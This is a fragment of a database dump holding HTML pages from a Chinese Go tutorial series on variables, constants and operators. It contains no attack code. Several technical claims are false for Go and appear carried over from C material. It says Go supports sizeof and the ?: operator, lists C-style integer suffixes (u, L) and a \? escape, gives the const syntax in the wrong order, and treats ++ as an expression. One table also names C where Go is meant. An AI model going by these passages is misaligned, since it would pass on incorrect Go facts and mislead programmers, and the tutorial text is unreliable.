\r\n</pre>\r\n\r\n<p>对于没有初始化定义：具有静态存储时间变量的隐含零初始化(所有字节的值为0);所有其它变量的初始值是它们的数据类型的零值。</p>\r\n\r\n<p>静态类型声明</p>\r\n\r\n<p>静态类型的变量声明保障到编译器，有一个变量存在具有给定类型和名称，这样编译器进行进一步的编辑，而不需要对变量的完整细节。变量声明有其意义在编译时止，编译器需要实际的变量声明在链接程序时。</p>\r\n\r\n<p>示例</p>\r\n\r\n<p>试试下面的例子，其中变量已经被声明为有型，并且已被定义及主要函数内部初始化：</p>\r\n\r\n<pre>\r\n<code class=\"language-javascript\">package main\r\n\r\nimport \"fmt\"\r\n\r\nfunc main() {\r\n   var x float64\r\n   x = 20.0\r\n   fmt.Println(x)\r\n   fmt.Printf(\"x is of type %T\\n\", x)\r\n}</code></pre>\r\n\r\n<p>让我们编译和运行上面的程序，这将产生以下结果：</p>\r\n\r\n<pre>\r\n20\r\nx is of type float64\r\n</pre>\r\n\r\n<p>动态类型声明/类型推断</p>\r\n\r\n<p>动态类型变量声明要求编译器解释的基础上传递给它值变量的类型。编译器不需要一个变量静态有类型的必然要求。</p>\r\n\r\n<p>示例</p>\r\n\r\n<p>试试下面的例子，其中的变量已经声明没有任何类型的，并已确定在主函数中初始化。如果类型推断的，我们已经初始化的变量y使用:=运算符，x初始化使用=运算符。</p>\r\n\r\n<pre>\r\n<code class=\"language-java\">package main\r\n\r\nimport \"fmt\"\r\n\r\nfunc main() {\r\n   var x float64 = 20.0\r\n\r\n   y := 42 \r\n   fmt.Println(x)\r\n   fmt.Println(y)\r\n   fmt.Printf(\"x is of type %T\\n\", x)\r\n   fmt.Printf(\"y is of type %T\\n\", y)	\r\n}</code></pre>\r\n\r\n<p>让我们编译和运行上面的程序，这将产生以下结果：</p>\r\n\r\n<pre>\r\n20\r\n42\r\nx is of type float64\r\ny is of type int\r\n</pre>\r\n\r\n<p>混合变量声明</p>\r\n\r\n<p>不同类型的变量可以一步到位使用类型推断声明。</p>\r\n\r\n<p>例子</p>\r\n\r\n<pre>\r\n<code class=\"language-javascript\">package main\r\n\r\nimport \"fmt\"\r\n\r\nfunc main() {\r\n   var a, b, c = 3, 4, \"foo\"  \r\n	\r\n   fmt.Println(a)\r\n   fmt.Println(b)\r\n   fmt.Println(c)\r\n   fmt.Printf(\"a is of type %T\\n\", a)\r\n   fmt.Printf(\"b is of type %T\\n\", b)\r\n   fmt.Printf(\"c is of type %T\\n\", c)\r\n}</code></pre>\r\n\r\n<p>让我们编译和运行上面的程序，这将产生以下结果：</p>\r\n\r\n<pre>\r\n3\r\n4\r\nfoo\r\na is of type int\r\nb is of type int\r\nc is of type string\r\n</pre>\r\n\r\n<p>在Go中的左值和右值：</p>\r\n\r\n<p>在Go中有两种表达式：</p>\r\n\r\n<ol>\r\n	<li>\r\n	<p><strong>lvalue :&nbsp;</strong>引用一个存储器位置的表达式被称为&ldquo;左值&rdquo;表达。左值可能显示为任一左手或赋值的右侧。</p>\r\n	</li>\r\n	<li>\r\n	<p><strong>rvalue :&nbsp;</strong>术语右值是指被存储在存储器中的某些地址的数据值。右值是不能分配给它的值，这意味着右值可能出现在赋值的右侧而不是左侧的表达式。</p>\r\n	</li>\r\n</ol>\r\n\r\n<p>变量是左值等都可能出现在赋值的左侧。数字文字是右值，因此可能不会被分配，不能出现在左侧。下面是一个有效语句：</p>\r\n\r\n<pre>\r\nx = 20.0\r\n</pre>\r\n\r\n<p>但是，下面是不是一个有效的声明，并会产生编译时错误：</p>\r\n\r\n<pre>\r\n10 = 20</pre>\r\n',0,0,'go语言系列教程6-变量',62,NULL,0),(36,0,'20150617091948',1,'<p>常量是指该程序可能无法在其执行期间改变的固定值。这些固定值也被称为文字。</p>\r\n\r\n<p>常量可以是任何像一个整型常量，一个浮点常量，字符常量或字符串文字的基本数据类型。还有枚举常量。</p>\r\n\r\n<p>常量是一样，只是它们的值不能自己定义后进行修改常规变量处理。</p>\r\n\r\n<p>整型常量</p>\r\n\r\n<p>一个整数文字可以是十进制，八进制，或十六进制常数。前缀指定基或基数：0x或0X的十六进制，0表示八进制，并没有为十进制。</p>\r\n\r\n<p>一个整数文字也可以有一个后缀为U和L的组合，分别为无符号和长整型。后缀可以是大写或小写，并且可以以任意顺序。</p>\r\n\r\n<p>这里是整数常量的一些例子：</p>\r\n\r\n<pre>\r\n212         /* Legal */\r\n215u        /* Legal */\r\n0xFeeL      /* Legal */\r\n078         /* Illegal: 8 is not an octal digit */\r\n032UU       /* Illegal: cannot repeat a suffix */\r\n</pre>\r\n\r\n<p>以下是不同类型的整型常量的例子：</p>\r\n\r\n<pre>\r\n85         /* decimal */\r\n0213       /* octal */\r\n0x4b       /* hexadecimal */\r\n30         /* int */\r\n30u        /* unsigned int */\r\n30l        /* long */\r\n30ul       /* unsigned long */\r\n</pre>\r\n\r\n<p>浮点文本(常量)</p>\r\n\r\n<p>浮点字面具有一个整数部分，一个小数点，一个小数部分，和一个指数部分。你可以表示十进制形式或指数形式浮点文字。</p>\r\n\r\n<p>同时采用十进制形式表示，则必须包括小数点，指数，或两者并用而指数形式表示，则必须包括整数部分，小数部分，或者两者兼而有之。有符号的指数，通过e或E表示</p>\r\n\r\n<p>下面是浮点面值的一些例子：</p>\r\n\r\n<pre>\r\n3.14159       /* Legal */\r\n314159E-5L    /* Legal */\r\n510E          /* Illegal: incomplete exponent */\r\n210f          /* Illegal: no decimal or exponent */\r\n.e55          /* Illegal: missing integer or fraction */\r\n</pre>\r\n\r\n<p>转义序列</p>\r\n\r\n<p>有一些字符在Go中，前面有一个反斜杠他们将有特殊的含义，它们被用来表示类似的换行符(\\n)或制表符(\\t)。在这里，有一些这样的转义序列代码的列表：</p>\r\n\r\n<table class=\"src\" style=\"background-color:rgb(247, 247, 247); border-collapse:collapse; border-color:rgb(214, 214, 214); border-spacing:0px; box-sizing:border-box; color:rgb(49, 49, 49); font-family:open sans,arial,hiragino sans gb,microsoft yahei,微软雅黑,stheiti,wenquanyi micro hei,simsun,sans-serif,sans-serif; font-size:14px; line-height:22px; margin-bottom:8px; margin-top:8px; max-width:100%; vertical-align:top; width:604px\">\r\n	<tbody>\r\n		<tr>\r\n			<th style=\"background-color:rgb(238, 238, 238); vertical-align:top; width:120px\">转义序列</th>\r\n			<th style=\"background-color:rgb(238, 238, 238); vertical-align:top\">含意</th>\r\n		</tr>\r\n		<tr>\r\n			<td style=\"vertical-align:top\">\\\\</td>\r\n			<td style=\"vertical-align:top\">\\&nbsp;字符</td>\r\n		</tr>\r\n		<tr>\r\n			<td style=\"vertical-align:top\">\\&#39;</td>\r\n			<td style=\"vertical-align:top\">&#39;&nbsp;字符</td>\r\n		</tr>\r\n		<tr>\r\n			<td style=\"vertical-align:top\">\\&quot;</td>\r\n			<td style=\"vertical-align:top\">&quot;&nbsp;字符</td>\r\n		</tr>\r\n		<tr>\r\n			<td style=\"vertical-align:top\">\\?</td>\r\n			<td style=\"vertical-align:top\">? 字符</td>\r\n		</tr>\r\n		<tr>\r\n			<td style=\"vertical-align:top\">\\a</td>\r\n			<td style=\"vertical-align:top\">警报或钟</td>\r\n		</tr>\r\n		<tr>\r\n			<td style=\"vertical-align:top\">\\b</td>\r\n			<td style=\"vertical-align:top\">退格</td>\r\n		</tr>\r\n		<tr>\r\n			<td style=\"vertical-align:top\">\\f</td>\r\n			<td style=\"vertical-align:top\">换页</td>\r\n		</tr>\r\n		<tr>\r\n			<td style=\"vertical-align:top\">\\n</td>\r\n			<td style=\"vertical-align:top\">换行符</td>\r\n		</tr>\r\n		<tr>\r\n			<td style=\"vertical-align:top\">\\r</td>\r\n			<td style=\"vertical-align:top\">回车</td>\r\n		</tr>\r\n		<tr>\r\n			<td style=\"vertical-align:top\">\\t</td>\r\n			<td style=\"vertical-align:top\">水平制表</td>\r\n		</tr>\r\n		<tr>\r\n			<td style=\"vertical-align:top\">\\v</td>\r\n			<td style=\"vertical-align:top\">垂直制表</td>\r\n		</tr>\r\n		<tr>\r\n			<td style=\"vertical-align:top\">\\ooo</td>\r\n			<td style=\"vertical-align:top\">一到三位数字的八进制数</td>\r\n		</tr>\r\n		<tr>\r\n			<td style=\"vertical-align:top\">\\xhh . . .</td>\r\n			<td style=\"vertical-align:top\">一个或多个数字的十六进制数</td>\r\n		</tr>\r\n	</tbody>\r\n</table>\r\n\r\n<p>以下为例子来说明一些转义字符序列：</p>\r\n\r\n<pre>\r\npackage main\r\n\r\n</pre>\r\n\r\n<pre>\r\n<code class=\"language-javascript\">\r\nimport \"fmt\"\r\n\r\nfunc main() {\r\n   fmt.Printf(\"Hello\\tWorld!\")\r\n}</code></pre>\r\n\r\n<p>当上述代码被编译和执行时，它产生了以下结果：</p>\r\n\r\n<pre>\r\nHello   World!\r\n</pre>\r\n\r\n<p>字符串文字</p>\r\n\r\n<p>字符串文字或常量用双引号&ldquo;&rdquo;。一个字符串包含类似于字符文字字符：普通字符，转义序列和通用字符。</p>\r\n\r\n<p>您可以使用字符串和分隔使用空格打破一个长行成多行。</p>\r\n\r\n<p>下面是字符串的一些例子。所有的三种形式是相同的字符串。</p>\r\n\r\n<pre>\r\n&quot;hello, dear&quot;\r\n\r\n&quot;hello, \\\r\n\r\ndear&quot;\r\n\r\n&quot;hello, &quot; &quot;d&quot; &quot;ear&quot;\r\n</pre>\r\n\r\n<p>const 关键字</p>\r\n\r\n<p>您可以使用 const 前缀来声明常量使用特定的类型如下：</p>\r\n\r\n<pre>\r\nconst variable type = value;\r\n</pre>\r\n\r\n<p>下面的例子说明了它的细节：</p>\r\n\r\n<pre>\r\n<code class=\"language-javascript\">package main\r\n\r\nimport \"fmt\"\r\n\r\nfunc main() {\r\n   const LENGTH int = 10\r\n   const WIDTH int = 5   \r\n   var area int\r\n\r\n   area = LENGTH * WIDTH\r\n   fmt.Printf(\"value of area : %d\", area)   \r\n}</code></pre>\r\n\r\n<p>当上述代码被编译和执行时，它产生了以下结果：</p>\r\n\r\n<pre>\r\nvalue of area : 50\r\n</pre>\r\n\r\n<p>请注意，这是一个良好的编程习惯大写定义常量。</p>\r\n',0,0,'go语言系列教程7-常量',65,NULL,0),(37,0,'20150617092404',1,'<p>运算符是一个符号，告诉编译器执行特定的数学或逻辑操作。 Go语言有丰富的内置运算符和运算符提供的以下几种类型：</p>\r\n\r\n<ul>\r\n	<li>\r\n	<p>算术运算符</p>\r\n	</li>\r\n	<li>\r\n	<p>关系运算符</p>\r\n	</li>\r\n	<li>\r\n	<p>逻辑运算符</p>\r\n	</li>\r\n	<li>\r\n	<p>位运算符</p>\r\n	</li>\r\n	<li>\r\n	<p>赋值运算符</p>\r\n	</li>\r\n	<li>\r\n	<p>其它运算符</p>\r\n	</li>\r\n</ul>\r\n\r\n<p>本教程将一个接一个介绍算术，关系，逻辑，位，分配和其他运算符。</p>\r\n\r\n<p>算术运算符</p>\r\n\r\n<p>下表列出了所有Go语言支持的算术运算符。假设变量A=10和变量B=20则：</p>\r\n\r\n<p>算术运算符示例</p>\r\n\r\n<table class=\"src\" style=\"background-color:rgb(247, 247, 247); border-collapse:collapse; border-color:rgb(214, 214, 214); border-spacing:0px; box-sizing:border-box; color:rgb(49, 49, 49); font-family:open sans,arial,hiragino sans gb,microsoft yahei,微软雅黑,stheiti,wenquanyi micro hei,simsun,sans-serif,sans-serif; font-size:14px; line-height:22px; margin-bottom:8px; margin-top:8px; max-width:100%; vertical-align:top; width:604px\">\r\n	<tbody>\r\n		<tr>\r\n			<th style=\"background-color:rgb(238, 238, 238); vertical-align:top; width:76px\">运算符</th>\r\n			<th style=\"background-color:rgb(238, 238, 238); vertical-align:top; width:331px\">描述</th>\r\n			<th style=\"background-color:rgb(238, 238, 238); vertical-align:top\">示例</th>\r\n		</tr>\r\n		<tr>\r\n			<td style=\"vertical-align:top\">+</td>\r\n			<td style=\"vertical-align:top\">两个操作数相加</td>\r\n			<td style=\"vertical-align:top\">A + B = 30</td>\r\n		</tr>\r\n		<tr>\r\n			<td style=\"vertical-align:top\">-</td>\r\n			<td style=\"vertical-align:top\">第一个操作数减第二操作数</td>\r\n			<td style=\"vertical-align:top\">A - B = -10</td>\r\n		</tr>\r\n		<tr>\r\n			<td style=\"vertical-align:top\">*</td>\r\n			<td style=\"vertical-align:top\">两个操作数相乘</td>\r\n			<td style=\"vertical-align:top\">A * B = 200</td>\r\n		</tr>\r\n		<tr>\r\n			<td style=\"vertical-align:top\">/</td>\r\n			<td style=\"vertical-align:top\">通过去分子除以分母</td>\r\n			<td style=\"vertical-align:top\">B / A = 2</td>\r\n		</tr>\r\n		<tr>\r\n			<td style=\"vertical-align:top\">%</td>\r\n			<td style=\"vertical-align:top\">模运算和整数除法后的余数</td>\r\n			<td style=\"vertical-align:top\">B % A = 0</td>\r\n		</tr>\r\n		<tr>\r\n			<td style=\"vertical-align:top\">++</td>\r\n			<td style=\"vertical-align:top\">运算符递增整数值增加一</td>\r\n			<td style=\"vertical-align:top\">A++ = 11</td>\r\n		</tr>\r\n		<tr>\r\n			<td style=\"vertical-align:top\">--</td>\r\n			<td style=\"vertical-align:top\">运算符递减整数值减一</td>\r\n			<td style=\"vertical-align:top\">A-- =&nbsp;9</td>\r\n		</tr>\r\n	</tbody>\r\n</table>\r\n\r\n<p>关系运算符</p>\r\n\r\n<p>下表列出了所有Go语言支持的关系运算符。假设变量A=10和变量B=20，则：</p>\r\n\r\n<p>运算符示例</p>\r\n\r\n<table class=\"src\" style=\"background-color:rgb(247, 247, 247); border-collapse:collapse; border-color:rgb(214, 214, 214); border-spacing:0px; box-sizing:border-box; color:rgb(49, 49, 49); font-family:open sans,arial,hiragino sans gb,microsoft yahei,微软雅黑,stheiti,wenquanyi micro hei,simsun,sans-serif,sans-serif; font-size:14px; line-height:22px; margin-bottom:8px; margin-top:8px; max-width:100%; vertical-align:top; width:604px\">\r\n	<tbody>\r\n		<tr>\r\n			<th style=\"background-color:rgb(238, 238, 238); vertical-align:top; width:76px\">运算符</th>\r\n			<th style=\"background-color:rgb(238, 238, 238); vertical-align:top; width:331px\">描述</th>\r\n			<th style=\"background-color:rgb(238, 238, 238); vertical-align:top\">示例</th>\r\n		</tr>\r\n		<tr>\r\n			<td style=\"vertical-align:top\">==</td>\r\n			<td style=\"vertical-align:top\">检查两个操作数的值是否相等，如果是的话那么条件为真。</td>\r\n			<td style=\"vertical-align:top\">(A == B) 不为 true.</td>\r\n		</tr>\r\n		<tr>\r\n			<td style=\"vertical-align:top\">!=</td>\r\n			<td style=\"vertical-align:top\">检查两个操作数的值是否相等，如果值不相等，则条件变为真。</td>\r\n			<td style=\"vertical-align:top\">(A != B) 为true.</td>\r\n		</tr>\r\n		<tr>\r\n			<td style=\"vertical-align:top\">&gt;</td>\r\n			<td style=\"vertical-align:top\">检查左边的操作数的值是否大于右操作数的值，如果是的话那么条件为真。</td>\r\n			<td style=\"vertical-align:top\">(A &gt; B)&nbsp;不为&nbsp;true.</td>\r\n		</tr>\r\n		<tr>\r\n			<td style=\"vertical-align:top\">&lt;</td>\r\n			<td style=\"vertical-align:top\">检查左边的操作数的值是否小于右操作数的值，如果是的话那么条件为真。</td>\r\n			<td style=\"vertical-align:top\">(A &lt; B)&nbsp;为&nbsp;true.</td>\r\n		</tr>\r\n		<tr>\r\n			<td style=\"vertical-align:top\">&gt;=</td>\r\n			<td style=\"vertical-align:top\">检查左边的操作数的值是否大于或等于右操作数的值，如果是的话那么条件为真。</td>\r\n			<td style=\"vertical-align:top\">(A &gt;= B)&nbsp;不为&nbsp;true.</td>\r\n		</tr>\r\n		<tr>\r\n			<td style=\"vertical-align:top\">&lt;=</td>\r\n			<td style=\"vertical-align:top\">检查左边的操作数的值是否小于或等于右操作数的值，如果是的话那么条件为真。</td>\r\n			<td style=\"vertical-align:top\">(A &lt;= B)&nbsp;为&nbsp;true.</td>\r\n		</tr>\r\n	</tbody>\r\n</table>\r\n\r\n<p>逻辑运算符</p>\r\n\r\n<p>下表列出了所有Go语言支持的逻辑运算符。假设变量A=1和变量B=0，则：</p>\r\n\r\n<p>逻辑运算示例</p>\r\n\r\n<table class=\"src\" style=\"background-color:rgb(247, 247, 247); border-collapse:collapse; border-color:rgb(214, 214, 214); border-spacing:0px; box-sizing:border-box; color:rgb(49, 49, 49); font-family:open sans,arial,hiragino sans gb,microsoft yahei,微软雅黑,stheiti,wenquanyi micro hei,simsun,sans-serif,sans-serif; font-size:14px; line-height:22px; margin-bottom:8px; margin-top:8px; max-width:100%; vertical-align:top; width:604px\">\r\n	<tbody>\r\n		<tr>\r\n			<th style=\"background-color:rgb(238, 238, 238); vertical-align:top; width:76px\">运算符</th>\r\n			<th style=\"background-color:rgb(238, 238, 238); vertical-align:top; width:331px\">描述</th>\r\n			<th style=\"background-color:rgb(238, 238, 238); vertical-align:top\">示例</th>\r\n		</tr>\r\n		<tr>\r\n			<td style=\"vertical-align:top\">&amp;&amp;</td>\r\n			<td style=\"vertical-align:top\">所谓逻辑与运算符。如果两个操作数都非零，则条件变为真。</td>\r\n			<td style=\"vertical-align:top\">(A &amp;&amp; B) 为 false.</td>\r\n		</tr>\r\n		<tr>\r\n			<td style=\"vertical-align:top\">||</td>\r\n			<td style=\"vertical-align:top\">所谓的逻辑或操作。如果任何两个操作数是非零，则条件变为真。</td>\r\n			<td style=\"vertical-align:top\">(A || B)&nbsp;为&nbsp;true.</td>\r\n		</tr>\r\n		<tr>\r\n			<td style=\"vertical-align:top\">!</td>\r\n			<td style=\"vertical-align:top\">所谓逻辑非运算符。使用反转操作数的逻辑状态。如果条件为真，那么逻辑非操后结果为假。</td>\r\n			<td style=\"vertical-align:top\">!(A &amp;&amp; B)&nbsp;为&nbsp;true.</td>\r\n		</tr>\r\n	</tbody>\r\n</table>\r\n\r\n<p>位运算符</p>\r\n\r\n<p>位运算符适用于位并进行逐位操作。 如下&nbsp;&amp;, |, ^ 的真值表</p>\r\n\r\n<table class=\"src\" style=\"background-color:rgb(247, 247, 247); border-collapse:collapse; border-color:rgb(214, 214, 214); border-spacing:0px; box-sizing:border-box; color:rgb(49, 49, 49); font-family:open sans,arial,hiragino sans gb,microsoft yahei,微软雅黑,stheiti,wenquanyi micro hei,simsun,sans-serif,sans-serif; font-size:14px; line-height:22px; margin-bottom:8px; margin-top:8px; max-width:100%; vertical-align:top; width:604px\">\r\n	<tbody>\r\n		<tr>\r\n			<th style=\"background-color:rgb(238, 238, 238); vertical-align:top; width:121px\">p</th>\r\n			<th style=\"background-color:rgb(238, 238, 238); vertical-align:top; width:121px\">q</th>\r\n			<th style=\"background-color:rgb(238, 238, 238); vertical-align:top; width:121px\">p &amp; q</th>\r\n			<th style=\"background-color:rgb(238, 238, 238); vertical-align:top; width:120px\">p | q</th>\r\n			<th style=\"background-color:rgb(238, 238, 238); vertical-align:top; width:120px\">p ^ q</th>\r\n		</tr>\r\n		<tr>\r\n			<td style=\"vertical-align:top\">0</td>\r\n			<td style=\"vertical-align:top\">0</td>\r\n			<td style=\"vertical-align:top\">0</td>\r\n			<td style=\"vertical-align:top\">0</td>\r\n			<td style=\"vertical-align:top\">0</td>\r\n		</tr>\r\n		<tr>\r\n			<td style=\"vertical-align:top\">0</td>\r\n			<td style=\"vertical-align:top\">1</td>\r\n			<td style=\"vertical-align:top\">0</td>\r\n			<td style=\"vertical-align:top\">1</td>\r\n			<td style=\"vertical-align:top\">1</td>\r\n		</tr>\r\n		<tr>\r\n			<td style=\"vertical-align:top\">1</td>\r\n			<td style=\"vertical-align:top\">1</td>\r\n			<td style=\"vertical-align:top\">1</td>\r\n			<td style=\"vertical-align:top\">1</td>\r\n			<td style=\"vertical-align:top\">0</td>\r\n		</tr>\r\n		<tr>\r\n			<td style=\"vertical-align:top\">1</td>\r\n			<td style=\"vertical-align:top\">0</td>\r\n			<td style=\"vertical-align:top\">0</td>\r\n			<td style=\"vertical-align:top\">1</td>\r\n			<td style=\"vertical-align:top\">1</td>\r\n		</tr>\r\n	</tbody>\r\n</table>\r\n\r\n<p>假设，如果A =60;且b =13;现在以二进制格式它们如下：</p>\r\n\r\n<p>A = 0011 1100</p>\r\n\r\n<p>B = 0000 1101</p>\r\n\r\n<p>-----------------</p>\r\n\r\n<p>A&amp;B = 0000 1100</p>\r\n\r\n<p>A|B = 0011 1101</p>\r\n\r\n<p>A^B = 0011 0001</p>\r\n\r\n<p>~A&nbsp; = 1100 0011</p>\r\n\r\n<p>C语言支持位运算符列在如下表。假设变量A=60和变量B=13，则：</p>\r\n\r\n<p>位运算符示例</p>\r\n\r\n<table class=\"src\" style=\"background-color:rgb(247, 247, 247); border-collapse:collapse; border-color:rgb(214, 214, 214); border-spacing:0px; box-sizing:border-box; color:rgb(49, 49, 49); font-family:open sans,arial,hiragino sans gb,microsoft yahei,微软雅黑,stheiti,wenquanyi micro hei,simsun,sans-serif,sans-serif; font-size:14px; line-height:22px; margin-bottom:8px; margin-top:8px; max-width:100%; vertical-align:top; width:604px\">\r\n	<tbody>\r\n		<tr>\r\n			<th style=\"background-color:rgb(238, 238, 238); vertical-align:top; width:76px\">运算</th>\r\n			<th style=\"background-color:rgb(238, 238, 238); vertical-align:top; width:331px\">描述</th>\r\n			<th style=\"background-color:rgb(238, 238, 238); vertical-align:top\">示例</th>\r\n		</tr>\r\n		<tr>\r\n			<td style=\"vertical-align:top\">&amp;</td>\r\n			<td style=\"vertical-align:top\">二进制与操作副本位的结果，如果它存在于两个操作数</td>\r\n			<td style=\"vertical-align:top\">(A &amp; B) = 12, 也就是&nbsp;0000 1100</td>\r\n		</tr>\r\n		<tr>\r\n			<td style=\"vertical-align:top\">|</td>\r\n			<td style=\"vertical-align:top\">二进制或操作副本，如果它存在一个操作数</td>\r\n			<td style=\"vertical-align:top\">(A | B) = 61,&nbsp;也就是&nbsp;0011 1101</td>\r\n		</tr>\r\n		<tr>\r\n			<td style=\"vertical-align:top\">^</td>\r\n			<td style=\"vertical-align:top\">二进制异或操作副本，如果它被设置在一个操作数但不能同时是比特</td>\r\n			<td style=\"vertical-align:top\">(A ^ B) = 49,&nbsp;也就是&nbsp;0011 0001</td>\r\n		</tr>\r\n		<tr>\r\n			<td style=\"vertical-align:top\">&lt;&lt;</td>\r\n			<td style=\"vertical-align:top\">二进制左移位运算符。左边的操作数的值向左移动由右操作数指定的位数</td>\r\n			<td style=\"vertical-align:top\">A &lt;&lt; 2 will give 240&nbsp;也就是&nbsp;1111 0000</td>\r\n		</tr>\r\n		<tr>\r\n			<td style=\"vertical-align:top\">&gt;&gt;</td>\r\n			<td style=\"vertical-align:top\">二进制向右移位运算符。左边的操作数的值由右操作数指定的位数向右移动</td>\r\n			<td style=\"vertical-align:top\">A &gt;&gt; 2 = 15 也就是 0000 1111</td>\r\n		</tr>\r\n	</tbody>\r\n</table>\r\n\r\n<p>赋值运算符</p>\r\n\r\n<p>Go语言支持以下赋值运算符：</p>\r\n\r\n<p>赋值运算符示例</p>\r\n\r\n<table class=\"src\" style=\"background-color:rgb(247, 247, 247); border-collapse:collapse; border-color:rgb(214, 214, 214); border-spacing:0px; box-sizing:border-box; color:rgb(49, 49, 49); font-family:open sans,arial,hiragino sans gb,microsoft yahei,微软雅黑,stheiti,wenquanyi micro hei,simsun,sans-serif,sans-serif; font-size:14px; line-height:22px; margin-bottom:8px; margin-top:8px; max-width:100%; vertical-align:top; width:604px\">\r\n	<tbody>\r\n		<tr>\r\n			<th style=\"background-color:rgb(238, 238, 238); vertical-align:top; width:76px\">运算符</th>\r\n			<th style=\"background-color:rgb(238, 238, 238); vertical-align:top; width:331px\">描述</th>\r\n			<th style=\"background-color:rgb(238, 238, 238); vertical-align:top\">示例</th>\r\n		</tr>\r\n		<tr>\r\n			<td style=\"vertical-align:top\">=</td>\r\n			<td style=\"vertical-align:top\">简单的赋值操作符，分配值从右边的操作数左侧的操作数</td>\r\n			<td style=\"vertical-align:top\">C = A + B 将分配A + B的值到C</td>\r\n		</tr>\r\n		<tr>\r\n			<td style=\"vertical-align:top\">+=</td>\r\n			<td style=\"vertical-align:top\">相加并赋值运算符，它增加了右操作数左操作数和分配结果左操作数</td>\r\n			<td style=\"vertical-align:top\">C += A 相当于 C = C + A</td>\r\n		</tr>\r\n		<tr>\r\n			<td style=\"vertical-align:top\">-=</td>\r\n			<td style=\"vertical-align:top\">减和赋值运算符，它减去右操作数从左侧的操作数和分配结果左操作数</td>\r\n			<td style=\"vertical-align:top\">C -= A&nbsp;相当于&nbsp;C = C - A</td>\r\n		</tr>\r\n		<tr>\r\n			<td style=\"vertical-align:top\">*=</td>\r\n			<td style=\"vertical-align:top\">乘法和赋值运算符，它乘以右边的操作数与左操作数和分配结果左操作数</td>\r\n			<td style=\"vertical-align:top\">C *= A is equivalent to C = C * A</td>\r\n		</tr>\r\n		<tr>\r\n			<td style=\"vertical-align:top\">/=</td>\r\n			<td style=\"vertical-align:top\">除法赋值运算符，它把左操作数与右操作数和分配结果左操作数</td>\r\n			<td style=\"vertical-align:top\">C /= A&nbsp;相当于&nbsp;C = C / A</td>\r\n		</tr>\r\n		<tr>\r\n			<td style=\"vertical-align:top\">%=</td>\r\n			<td style=\"vertical-align:top\">模量和赋值运算符，它需要使用两个操作数的模量和分配结果左操作数</td>\r\n			<td style=\"vertical-align:top\">C %= A&nbsp;相当于&nbsp;C = C % A</td>\r\n		</tr>\r\n		<tr>\r\n			<td style=\"vertical-align:top\">&lt;&lt;=</td>\r\n			<td style=\"vertical-align:top\">左移位并赋值运算符</td>\r\n			<td style=\"vertical-align:top\">C &lt;&lt;= 2&nbsp;相同于&nbsp;C = C &lt;&lt; 2</td>\r\n		</tr>\r\n		<tr>\r\n			<td style=\"vertical-align:top\">&gt;&gt;=</td>\r\n			<td style=\"vertical-align:top\">向右移位并赋值运算符</td>\r\n			<td style=\"vertical-align:top\">C &gt;&gt;= 2&nbsp;相同于&nbsp;C = C &gt;&gt; 2</td>\r\n		</tr>\r\n		<tr>\r\n			<td style=\"vertical-align:top\">&amp;=</td>\r\n			<td style=\"vertical-align:top\">按位与赋值运算符</td>\r\n			<td style=\"vertical-align:top\">C &amp;= 2&nbsp;相同于&nbsp;C = C &amp; 2</td>\r\n		</tr>\r\n		<tr>\r\n			<td style=\"vertical-align:top\">^=</td>\r\n			<td style=\"vertical-align:top\">按位异或并赋值运算符</td>\r\n			<td style=\"vertical-align:top\">C ^= 2&nbsp;相同于&nbsp;C = C ^ 2</td>\r\n		</tr>\r\n		<tr>\r\n			<td style=\"vertical-align:top\">|=</td>\r\n			<td style=\"vertical-align:top\">按位或并赋值运算符</td>\r\n			<td style=\"vertical-align:top\">C |= 2&nbsp;相同于&nbsp;C = C | 2</td>\r\n		</tr>\r\n	</tbody>\r\n</table>\r\n\r\n<p>其它运算符</p>\r\n\r\n<p>还有其他一些重要的运算符，包括sizeof和?:在Go语言中也支持。</p>\r\n\r\n<p>其它运算符示例</p>\r\n\r\n<table class=\"src\" style=\"background-color:rgb(247, 247, 247); border-collapse:collapse; border-color:rgb(214, 214, 214); border-spacing:0px; box-sizing:border-box; color:rgb(49, 49, 49); font-family:open sans,arial,hiragino sans gb,microsoft yahei,微软雅黑,stheiti,wenquanyi micro hei,simsun,sans-serif,sans-serif; font-size:14px; line-height:22px; margin-bottom:8px; margin-top:8px; max-width:100%; vertical-align:top; width:604px\">\r\n	<tbody>\r\n		<tr>\r\n			<th style=\"background-color:rgb(238, 238, 238); vertical-align:top; width:76px\">操作符</th>\r\n			<th style=\"background-color:rgb(238, 238, 238); vertical-align:top; width:331px\">描述</th>\r\n			<th style=\"background-color:rgb(238, 238, 238); vertical-align:top\">示例</th>\r\n		</tr>\r\n		<tr>\r\n			<td style=\"vertical-align:top\">&amp;</td>\r\n			<td style=\"vertical-align:top\">返回一个变量的地址</td>\r\n			<td style=\"vertical-align:top\">&amp;a; 将得到变量的实际地址</td>\r\n		</tr>\r\n		<tr>\r\n			<td style=\"vertical-align:top\">*</td>\r\n			<td style=\"vertical-align:top\">指针的变量</td>\r\n			<td style=\"vertical-align:top\">*a; 将指向一个变量</td>\r\n		</tr>\r\n	</tbody>\r\n</table>\r\n\r\n<p>Go语言运算符优先级</p>\r\n\r\n<p>运算符优先级决定术语的表达分组。这会影响一个表达式是如何进行评估计算。某些运算符的优先级高于其他;例如，乘法运算符的优先级比所述加法运算更高。</p>\r\n\r\n<p>例如X =7 + 3* 2;这里，x被赋值13，而不是20，因为操作员*具有优先级高于+，所以它首先被乘以3 * 2，然后相加上7。</p>\r\n\r\n<p>这里，具有最高优先级的操作出现在表的顶部，那些具有最低出现在底部。在一个表达式，更高的优先级运算符将首先评估计算。</p>\r\n\r\n<p>运算符优先级示例</p>\r\n\r\n<table class=\"src\" style=\"background-color:rgb(247, 247, 247); border-collapse:collapse; border-color:rgb(214, 214, 214); border-spacing:0px; box-sizing:border-box; color:rgb(49, 49, 49); font-family:open sans,arial,hiragino sans gb,microsoft yahei,微软雅黑,stheiti,wenquanyi micro hei,simsun,sans-serif,sans-serif; font-size:14px; line-height:22px; margin-bottom:8px; margin-top:8px; max-width:100%; vertical-align:top; width:604px\">\r\n	<tbody>\r\n		<tr>\r\n			<th style=\"background-color:rgb(238, 238, 238); vertical-align:top\">分类&nbsp;</th>\r\n			<th style=\"background-color:rgb(238, 238, 238); vertical-align:top\">运算符&nbsp;</th>\r\n			<th style=\"background-color:rgb(238, 238, 238); vertical-align:top\">关联&nbsp;</th>\r\n		</tr>\r\n		<tr>\r\n			<td style=\"vertical-align:top\">后缀</td>\r\n			<td style=\"vertical-align:top\">() [] -&gt; . ++ - - &nbsp;</td>\r\n			<td style=\"vertical-align:top\">从左到右</td>\r\n		</tr>\r\n		<tr>\r\n			<td style=\"vertical-align:top\">一元</td>\r\n			<td style=\"vertical-align:top\">+ - ! 